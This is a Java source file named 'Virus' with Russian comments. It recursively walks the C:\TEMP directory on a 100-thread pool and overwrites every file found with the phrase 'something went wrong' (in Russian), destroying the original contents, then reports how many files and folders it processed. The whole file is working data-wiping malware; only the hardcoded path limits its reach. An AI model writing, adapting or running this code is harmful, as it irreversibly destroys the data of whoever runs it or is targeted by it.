import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicInteger;

public class Virus {
    public static void main(String[] args) {
        ExecutorService executorService = Executors.newFixedThreadPool(100);

        String path = "C:\\TEMP"; // путь к директории
        List<Future<?>> futures = new ArrayList<>();

        // Потокобезопасные счётчики
        AtomicInteger fileCount = new AtomicInteger(0);
        AtomicInteger dirCount = new AtomicInteger(0);

        exploreDirectory(path, executorService, futures, fileCount, dirCount);

        // Дожидаемся завершения всех задач
        for (Future<?> future : futures) {
            try {
                future.get();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        executorService.shutdown();

        // Вывод результатов
        System.out.println("\nОбработка завершена.");
        System.out.println("Файлов обработано: " + fileCount.get());
        System.out.println("Папок обработано: " + dirCount.get());
    }

    private static void exploreDirectory(String path, ExecutorService executor,
                                         List<Future<?>> futures,
                                         AtomicInteger fileCount,
                                         AtomicInteger dirCount) {
        File directory = new File(path);

        if (!directory.exists() || !directory.isDirectory()) {
            System.out.println("Неправильный путь: " + path);
            return;
        }

        File[] filesAndDirs = directory.listFiles();
        if (filesAndDirs != null) {
            for (File fileOrDir : filesAndDirs) {
                String fullPath = fileOrDir.getAbsolutePath();

                if (fileOrDir.isDirectory()) {
                    System.out.println("Директория: " + fullPath);
                    dirCount.incrementAndGet(); // увеличиваем счётчик папок
                    exploreDirectory(fullPath, executor, futures, fileCount, dirCount);
                } else {
                    System.out.println("Файл: " + fullPath);
                    fileCount.incrementAndGet(); // увеличиваем счётчик файлов
                    Future<?> future = executor.submit(() -> writeToFile(fileOrDir));
                    futures.add(future);
                }
            }
        } else {
            System.out.println("Ошибка: не удалось получить содержимое директории " + path);
        }
    }

    private static void writeToFile(File file) {
        try (FileWriter fw = new FileWriter(file, false)) {
            fw.write("что то пошло не так\n");
            System.out.println("Записано в файл: " + file.getAbsolutePath() +
                    " | Поток: " + Thread.currentThread().getName());
        } catch (IOException e) {
            System.out.println("Ошибка при записи в файл " + file.getAbsolutePath() + ": " + e.getMessage());
        }
    }
}
